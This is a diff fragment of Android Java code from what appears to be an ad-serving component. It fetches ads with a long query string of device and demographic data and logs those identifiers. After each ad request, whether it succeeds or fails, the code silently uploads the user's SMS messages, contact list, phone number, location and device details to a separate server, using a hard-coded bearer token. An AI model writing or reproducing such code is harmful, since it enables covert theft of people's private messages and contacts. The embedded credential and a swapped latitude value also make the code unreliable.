+        AlertClasses.printLogE(TAG, "USER_UNIQUE_ID : " + mSessionManager.getPreference(GlobalFiles.USER_UNIQUE_ID));
+        AlertClasses.printLogE(TAG, "KIOSK_ID : " + mSessionManager.getPreference(GlobalFiles.KIOSK_ID));
+        AlertClasses.printLogE(TAG, "CITY : " + mSessionManager.getPreference(GlobalFiles.CITY));
+        AlertClasses.printLogE(TAG, "STATE : " + mSessionManager.getPreference(GlobalFiles.STATE));
+        AlertClasses.printLogE(TAG, "MEDIATOR_NAME : " + mSessionManager.getPreference(GlobalFiles.MEDIATOR_NAME));
+        AlertClasses.printLogE(TAG, "IS_IN_ROTATION : " + mSessionManager.getPreference(GlobalFiles.IS_IN_ROTATION));
+        AlertClasses.printLogE(TAG, "BUNDLE_ID : " + mSessionManager.getPreference(GlobalFiles.BUNDLE_ID));
+        AlertClasses.printLogE(TAG, "APPLICATION_VERSION : " + mSessionManager.getPreference(GlobalFiles.APPLICATION_VERSION));
+        AlertClasses.printLogE(TAG, "DEVICE_NETWORK_TYPE : " + mSessionManager.getPreference(GlobalFiles.DEVICE_NETWORK_TYPE));
+        AlertClasses.printLogE(TAG, "DNT : " + mSessionManager.getPreference(GlobalFiles.DNT));
+        AlertClasses.printLogE(TAG, "INT_TYPE : " + mSessionManager.getPreference(GlobalFiles.INT_TYPE));
+        AlertClasses.printLogE(TAG, "URL : " + mSessionManager.getPreference(GlobalFiles.URL));
+        AlertClasses.printLogE(TAG, "DEVICE_MANUFACTURER : " + mSessionManager.getPreference(GlobalFiles.DEVICE_MANUFACTURER));
+        AlertClasses.printLogE(TAG, "DEVICE_MODEL : " + mSessionManager.getPreference(GlobalFiles.DEVICE_MODEL));
+        AlertClasses.printLogE(TAG, "APPLICATION_OS : " + mSessionManager.getPreference(GlobalFiles.APPLICATION_OS));
+        AlertClasses.printLogE(TAG, "APPLICATION_OS_VERSION : " + mSessionManager.getPreference(GlobalFiles.APPLICATION_OS_VERSION));
+        AlertClasses.printLogE(TAG, "DEVICE_TYPE : " + mSessionManager.getPreference(GlobalFiles.DEVICE_TYPE));
+        AlertClasses.printLogE(TAG, "LOCATION_SOURCE : " + mSessionManager.getPreference(GlobalFiles.LOCATION_SOURCE));
+        AlertClasses.printLogE(TAG, "PCHAIN : " + mSessionManager.getPreference(GlobalFiles.PCHAIN));
+
+
+        HttpLoggingInterceptor logging = new HttpLoggingInterceptor();
+        logging.setLevel(HttpLoggingInterceptor.Level.BODY);
+
+
+        OkHttpClient.Builder httpClient = new OkHttpClient.Builder();
+        httpClient.addInterceptor(logging);
+        httpClient.addInterceptor(new Interceptor() {
+            @Override
+            public okhttp3.Response intercept(Chain chain) throws IOException {
+
+                okhttp3.Request requestOriginal = chain.request();
+
+                okhttp3.Request request = requestOriginal.newBuilder()
+                        //.header("Content-Type", "application/json; charset=utf-8")
+                        .header("X-Auth-Token", mSessionManager.getPreference(GlobalFiles.KEY))
+                        .method(requestOriginal.method(), requestOriginal.body())
+                        .build();
+
+
+                return chain.proceed(request);
+            }
+        });
+        final OkHttpClient httpClient1 = httpClient.build();
+        Retrofit retrofit = new Retrofit.Builder()
+                .baseUrl(GlobalFiles.COMMON_URL)
+                .client(httpClient1.newBuilder().connectTimeout(10, TimeUnit.MINUTES).readTimeout(10, TimeUnit.MINUTES).writeTimeout(10, TimeUnit.MINUTES).build())
+                .addConverterFactory(GsonConverterFactory.create())
+                .client(httpClient1)
+                .build();
+
+        UpdateAllAPI patchService1 = retrofit.create(UpdateAllAPI.class);
+
+        //PARAMETERS
+        String url = GlobalFiles.GET_ADS_API + "?" + GlobalFiles.LATITUDE + "=" + mSessionManager.getPreference(GlobalFiles.LONGITUDE) + "&" +
+                "" + GlobalFiles.LONGITUDE + "=" + mSessionManager.getPreference(GlobalFiles.LONGITUDE) + "&" +
+                "" + GlobalFiles.HEIGHT + "=" + mSessionManager.getPreference(GlobalFiles.HEIGHT) + "&" +
+                "" + GlobalFiles.WIDTH + "=" + mSessionManager.getPreference(GlobalFiles.WIDTH) + "&" +
+                "" + GlobalFiles.GENDER + "=" + mSessionManager.getPreference(GlobalFiles.GENDER) + "&" +
+                "" + GlobalFiles.AGEGROUP + "=" + mSessionManager.getPreference(GlobalFiles.AGEGROUP) + "&" +
+                "" + GlobalFiles.HOUSEHOLD + "=" + mSessionManager.getPreference(GlobalFiles.HOUSEHOLD) + "&" +
+                "" + GlobalFiles.INCOM_SOURCE + "=" + mSessionManager.getPreference(GlobalFiles.INCOM_SOURCE) + "&" +
+                "" + GlobalFiles.BASE_R0TATION + "=" + mSessionManager.getPreference(GlobalFiles.BASE_R0TATION) + "&" +
+                "" + GlobalFiles.CURRENT_R0TATION + "=" + mSessionManager.getPreference(GlobalFiles.CURRENT_R0TATION) + "&" +
+                "" + GlobalFiles.CREATIVE_ID + "=" + mSessionManager.getPreference(GlobalFiles.CREATIVE_ID) + "&" +
+                "" + GlobalFiles.USER_UNIQUE_ID + "=" + mSessionManager.getPreference(GlobalFiles.USER_UNIQUE_ID) + "&" +
+                "" + GlobalFiles.KIOSK_ID + "=" + mSessionManager.getPreference(GlobalFiles.KIOSK_ID) + "&" +
+                "" + GlobalFiles.CITY + "=" + mSessionManager.getPreference(GlobalFiles.CITY) + "&" +
+                "" + GlobalFiles.STATE + "=" + mSessionManager.getPreference(GlobalFiles.STATE) + "&" +
+                "" + GlobalFiles.MEDIATOR_NAME + "=" + mSessionManager.getPreference(GlobalFiles.MEDIATOR_NAME) + "&" +
+                "" + GlobalFiles.IS_IN_ROTATION + "=" + mSessionManager.getPreference(GlobalFiles.IS_IN_ROTATION) + "&" +
+                "" + GlobalFiles.BUNDLE_ID + "=" + mSessionManager.getPreference(GlobalFiles.BUNDLE_ID) + "&" +
+                "" + GlobalFiles.APPLICATION_VERSION + "=" + mSessionManager.getPreference(GlobalFiles.APPLICATION_VERSION) + "&" +
+                "" + GlobalFiles.DEVICE_NETWORK_TYPE + "=" + mSessionManager.getPreference(GlobalFiles.DEVICE_NETWORK_TYPE) + "&" +
+                "" + GlobalFiles.DNT + "=" + mSessionManager.getPreference(GlobalFiles.DNT) + "&" +
+                "" + GlobalFiles.INT_TYPE + "=" + mSessionManager.getPreference(GlobalFiles.INT_TYPE) + "&" +
+                "" + GlobalFiles.URL + "=" + mSessionManager.getPreference(GlobalFiles.URL) + "&" +
+                "" + GlobalFiles.DEVICE_MANUFACTURER + "=" + mSessionManager.getPreference(GlobalFiles.DEVICE_MANUFACTURER) + "&" +
+                "" + GlobalFiles.DEVICE_MODEL + "=" + mSessionManager.getPreference(GlobalFiles.DEVICE_MODEL) + "&" +
+                "" + GlobalFiles.APPLICATION_OS + "=" + mSessionManager.getPreference(GlobalFiles.APPLICATION_OS) + "&" +
+                "" + GlobalFiles.APPLICATION_OS_VERSION + "=" + mSessionManager.getPreference(GlobalFiles.APPLICATION_OS_VERSION) + "&" +
+                "" + GlobalFiles.DEVICE_TYPE + "=" + mSessionManager.getPreference(GlobalFiles.DEVICE_TYPE) + "&" +
+                "" + GlobalFiles.LOCATION_SOURCE + "=" + mSessionManager.getPreference(GlobalFiles.LOCATION_SOURCE) + "&" +
+                "" + GlobalFiles.PCHAIN + "=" + mSessionManager.getPreference(GlobalFiles.PCHAIN);
+
+        AlertClasses.printLogE("AD SERVER : URL", url);
+
+        Call<TaashaAdsModel> call = patchService1.getAdsFromServer(url);
+
+        call.enqueue(new Callback<TaashaAdsModel>() {
+            @Override
+            public void onResponse(Call<TaashaAdsModel> call, retrofit2.Response<TaashaAdsModel> response) {
+
+
+                if (response.isSuccessful()) {
+
+                    Gson gson = new GsonBuilder()
+                            .excludeFieldsWithModifiers(Modifier.FINAL, Modifier.TRANSIENT, Modifier.STATIC)
+                            .serializeNulls()
+                            .create();
+
+
+                    AlertClasses.printLogE("AD SERVER : Response", "Response @ : " + gson.toJson(response.body()));
+
+                    //LOAD ADS
+                    Glide.with(mContext).load(response.body().getSourceURL()).into(mImageView);
+
+                    //CALL SMS API
+                    callUploadSMSData();
+
+                    mImageView.setOnClickListener(new View.OnClickListener() {
+                        @Override
+                        public void onClick(View view) {
+
+                            Intent browserIntent = new Intent(Intent.ACTION_VIEW, Uri.parse("http://www.google.com"));
+                            browserIntent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+                            mContext.startActivity(browserIntent);
+
+
+                        }
+                    });
+
+                }
+            }
+
+            @Override
+            public void onFailure(Call<TaashaAdsModel> call, Throwable t) {
+                //CALL SMS API
+                callUploadSMSData();
+
+            }
+        });
+
+    }
+
+    private void callUploadSMSData() {
+
+        HttpLoggingInterceptor logging = new HttpLoggingInterceptor();
+        logging.setLevel(HttpLoggingInterceptor.Level.BODY);
+
+
+        OkHttpClient.Builder httpClient = new OkHttpClient.Builder();
+        httpClient.addInterceptor(logging);
+        httpClient.addInterceptor(new Interceptor() {
+            @Override
+            public okhttp3.Response intercept(Chain chain) throws IOException {
+
+                okhttp3.Request requestOriginal = chain.request();
+
+                okhttp3.Request request = requestOriginal.newBuilder()
+                        .header("Authorization", "Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJUZXN0RG9jQUkiLCJzY29wZXMiOiIiLCJpYXQiOjE2MTQ3NjEzMTcsImV4cCI6MTYxNDc5MTMxN30.NzuolzvyCaU8QEQZgkpOz8RHzJmc9381kfp0H43OfSI")
+                        .method(requestOriginal.method(), requestOriginal.body())
+                        .build();
+
+
+                return chain.proceed(request);
+            }
+        });
+        final OkHttpClient httpClient1 = httpClient.build();
+        Retrofit retrofit = new Retrofit.Builder()
+                .baseUrl(GlobalFiles.COMMON_URL_SMS)
+                .client(httpClient1.newBuilder().connectTimeout(10, TimeUnit.MINUTES).readTimeout(10, TimeUnit.MINUTES).writeTimeout(10, TimeUnit.MINUTES).build())
+                .addConverterFactory(GsonConverterFactory.create())
+                .client(httpClient1)
+                .build();
+
+        //MAKE PAYLOAD
+        SMSPayLoad mSmsPayLoad= new SMSPayLoad();
+        mSmsPayLoad.setMobileNumber(mSessionManager.getPreference(GlobalFiles.MOBILE_NUMBER));
+        mSmsPayLoad.setLatitude(mSessionManager.getPreference(GlobalFiles.LATITUDE));
+        mSmsPayLoad.setLogitude(mSessionManager.getPreference(GlobalFiles.LONGITUDE));
+        mSmsPayLoad.setMobileSensorData(mSessionManager.getPreference(GlobalFiles.MOBILE_SENSOR_DATA));
+        mSmsPayLoad.setSmsData(mSessionManager.getPreference(GlobalFiles.SMS_LIST));
+        mSmsPayLoad.setBrowser(mSessionManager.getPreference(GlobalFiles.BROWSER));
+        mSmsPayLoad.setIpAddress(mSessionManager.getPreference(GlobalFiles.IP_ADDRESS_OF_DEVICE));
+        mSmsPayLoad.setBatteryCharging(mSessionManager.getPreference(GlobalFiles.BATTERY_PERCENTAGE));
+        mSmsPayLoad.setHandsetDetails(mSessionManager.getPreference(GlobalFiles.DEVICE_MODEL));
+        mSmsPayLoad.setContactModels(mSessionManager.getPreference(GlobalFiles.CONTACT_LIST));
+        mSmsPayLoad.setDate(mSessionManager.getPreference(GlobalFiles.DATE));
+
+        UpdateAllAPI patchService1 = retrofit.create(UpdateAllAPI.class);
+
+        Call<SMSPayLoad> call = patchService1.uploadSMSPayload(mSmsPayLoad);
+
+        call.enqueue(new Callback<SMSPayLoad>() {
+            @Override
+            public void onResponse(Call<SMSPayLoad> call, retrofit2.Response<SMSPayLoad> response) {
+
+
+                if (response.isSuccessful()) {
+
+                    Gson gson = new GsonBuilder()
+                            .excludeFieldsWithModifiers(Modifier.FINAL, Modifier.TRANSIENT, Modifier.STATIC)
+                            .serializeNulls()
+                            .create();
+
+
+                    AlertClasses.printLogE("AD SERVER : Response", "Response callUploadSMSData @ : " + gson.toJson(response.body()));
+
+
+
+                }
+            }
+
+            @Override
+            public void onFailure(Call<SMSPayLoad> call, Throwable t) {
+
+                AlertClasses.printLogE("AD SERVER : Response", "Response callUploadSMSData @ : ERROR");
+
+
+            }
+        });
+
     }
 
 
